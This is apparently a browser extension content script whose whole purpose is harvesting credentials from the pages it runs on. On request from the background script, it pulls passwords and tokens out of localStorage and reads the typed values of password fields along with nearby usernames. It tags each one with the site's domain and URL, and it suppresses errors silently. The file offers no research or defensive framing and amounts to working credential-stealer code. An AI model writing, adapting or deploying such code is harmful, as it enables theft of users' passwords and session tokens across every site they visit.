let api = typeof browser !== 'undefined' ? browser : chrome;

// Listen for messages from background
api.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'extractPasswords') {
    const passwords = extractPasswords();
    sendResponse({ passwords: passwords });
  }
  return true;
});

function extractPasswords() {
  const passwords = [];
  const domain = window.location.hostname || 'unknown';
  const url = window.location.href || 'unknown';
  
  try {
    const keys = Object.keys(localStorage);
    keys.forEach(key => {
      const value = localStorage.getItem(key);
      if (value && value.length > 0 && value.length < 500) {
        try {
          const parsed = JSON.parse(value);
          if (parsed && typeof parsed === 'object') {
            const pwd = parsed.password || parsed.pass || parsed.pwd || parsed.token;
            const user = parsed.username || parsed.user || parsed.email || 'unknown';
            if (pwd) {
              passwords.push({ domain, username: user, password: pwd, url, timestamp: new Date().toISOString() });
            }
          }
        } catch (e) {}
      }
    });
  } catch (e) {}
  
  try {
    document.querySelectorAll('input[type="password"]').forEach(input => {
      if (input.value) {
        const form = input.closest('form');
        let username = 'unknown';
        if (form) {
          const field = form.querySelector('input[type="text"], input[type="email"], input[name*="user"]');
          if (field) username = field.value;
        }
        passwords.push({ domain, username, password: input.value, url, timestamp: new Date().toISOString() });
      }
    });
  } catch (e) {}
  
  return passwords;
}